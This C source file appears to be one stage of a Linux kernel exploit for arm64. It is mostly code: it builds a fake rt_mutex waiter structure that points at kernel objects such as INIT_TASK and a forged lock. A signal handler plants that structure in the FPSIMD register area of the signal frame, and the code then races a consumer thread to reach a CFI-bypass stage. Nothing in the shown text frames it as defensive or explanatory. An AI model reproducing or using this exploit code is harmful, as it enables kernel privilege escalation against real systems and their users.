#include "common.h"
#include <asm/sigcontext.h>

#ifndef FPSIMD_MAGIC
#define FPSIMD_MAGIC 0x46508001
#endif
#ifndef SIGRETURN_VREGS_WAITER_OFF
#define SIGRETURN_VREGS_WAITER_OFF 0x00
#endif
#ifndef SIGRETURN_ATTEMPTS
#define SIGRETURN_ATTEMPTS 64
#endif
#ifndef SIGRETURN_SPIN_ITERS
#define SIGRETURN_SPIN_ITERS 8000
#endif

static volatile int sigreturn_done;
static uint8_t g_sr_waiter[128];
static size_t g_sr_waiter_size;

static void sigreturn_handler(int sig, siginfo_t *info, void *uctx) {
  (void)sig;
  (void)info;
  ucontext_t *uc = (ucontext_t *)uctx;
  unsigned char *mc = (unsigned char *)&uc->uc_mcontext;

  for (int off = 0; off < 4096; off += 16) {
    uint32_t magic;
    memcpy(&magic, mc + off, sizeof(magic));
    if (magic == FPSIMD_MAGIC) {
      uint8_t *vregs = mc + off + 16;
      size_t copy_len = g_sr_waiter_size;
      if (SIGRETURN_VREGS_WAITER_OFF + copy_len > 512)
        copy_len = 512 - SIGRETURN_VREGS_WAITER_OFF;
      memcpy(vregs + SIGRETURN_VREGS_WAITER_OFF, g_sr_waiter, copy_len);
      sigreturn_done = 1;
      return;
    }
  }
}

static void build_sr_waiter(void) {
  memset(g_sr_waiter, 0, sizeof(g_sr_waiter));

#if LEGACY_RT_MUTEX_WAITER
  put64(g_sr_waiter, 0x00, fake_w0);
  put64(g_sr_waiter, 0x08, 0);
  put64(g_sr_waiter, 0x10, 0);
  put64(g_sr_waiter, 0x18, 0);
  put64(g_sr_waiter, 0x20, 0);
  put64(g_sr_waiter, 0x28, 0);
  put64(g_sr_waiter, 0x30, text_addr(INIT_TASK));
  put64(g_sr_waiter, 0x38, fake_lock);
  put32(g_sr_waiter, 0x40, SLIDE_FAKE_WAITER_PRIO);
  put64(g_sr_waiter, 0x48, 0);
  g_sr_waiter_size = FAKE_WAITER_LAYOUT_SIZE;
#elif COMPACT_RT_MUTEX_WAITER
  put64(g_sr_waiter, 0x00, fake_w0);
  put64(g_sr_waiter, 0x08, 0);
  put64(g_sr_waiter, 0x10, 0);
  put64(g_sr_waiter, FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 0);
  put64(g_sr_waiter, FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
  put64(g_sr_waiter, FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0);
  put64(g_sr_waiter, FAKE_WAITER_TASK_OFF, text_addr(INIT_TASK));
  put64(g_sr_waiter, FAKE_WAITER_LOCK_OFF, fake_lock);
  put32(g_sr_waiter, FAKE_WAITER_PRIO_OFF, SLIDE_FAKE_WAITER_PRIO);
  put64(g_sr_waiter, FAKE_WAITER_DEADLINE_OFF, 0);
  put64(g_sr_waiter, FAKE_WAITER_WW_CTX_OFF, 0);
  g_sr_waiter_size = FAKE_WAITER_LAYOUT_SIZE;
#else
  put64(g_sr_waiter, 0x00, fake_w0);
  put64(g_sr_waiter, 0x08, 0);
  put64(g_sr_waiter, 0x10, 0);
  put32(g_sr_waiter, FAKE_WAITER_TREE_PRIO_OFF, SLIDE_FAKE_WAITER_PRIO);
  put64(g_sr_waiter, FAKE_WAITER_TREE_DEADLINE_OFF, 0);
  put64(g_sr_waiter, FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 0);
  put64(g_sr_waiter, FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
  put64(g_sr_waiter, FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0);
  put32(g_sr_waiter, FAKE_WAITER_PI_TREE_PRIO_OFF, SLIDE_FAKE_WAITER_PRIO);
  put64(g_sr_waiter, FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
  put64(g_sr_waiter, FAKE_WAITER_TASK_OFF, text_addr(INIT_TASK));
  put64(g_sr_waiter, FAKE_WAITER_LOCK_OFF, fake_lock);
  put32(g_sr_waiter, FAKE_WAITER_WAKE_STATE_OFF, 0);
  put64(g_sr_waiter, FAKE_WAITER_WW_CTX_OFF, 0);
  g_sr_waiter_size = FAKE_WAITER_LAYOUT_SIZE;
#endif
}

void do_sigreturn_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("sigreturn route missing kernel page base=%016zx lock=%016zx "
             "fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  build_sr_waiter();

  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = sigreturn_handler;
  sa.sa_flags = SA_SIGINFO | SA_RESTART;
  sigaction(SIGUSR1, &sa, NULL);

  int route_verified = 0;
  int calls = 0;
  int success = 0;
  int self_tid = (int)syscall(SYS_gettid);

  for (int attempt = 1; attempt <= SIGRETURN_ATTEMPTS; attempt++) {
    sigreturn_done = 0;
    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&punch_consume_go, attempt);

    syscall(SYS_tgkill, getpid(), self_tid, SIGUSR1);

    if (!sigreturn_done) {
      atomic_store(&punch_consume_go, 0);
      pr_warning("sigreturn handler missed FPSIMD context attempt=%d\n",
                 attempt);
      break;
    }

    for (int spin = 0; spin < SIGRETURN_SPIN_ITERS; spin++) {
      __asm__ volatile("yield" ::: "memory");
    }

    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);

    if (calls > 0 && success > 0) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
        break;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    }

    if (cfi_dirty_seen) {
      break;
    }
  }

  atomic_store(&punch_consume_go, 0);
  pr_info("sigreturn route done=%d calls=%d success=%d step=%d errno=%d\n",
          route_verified, calls, success, cfi_last_step, cfi_last_errno);
}
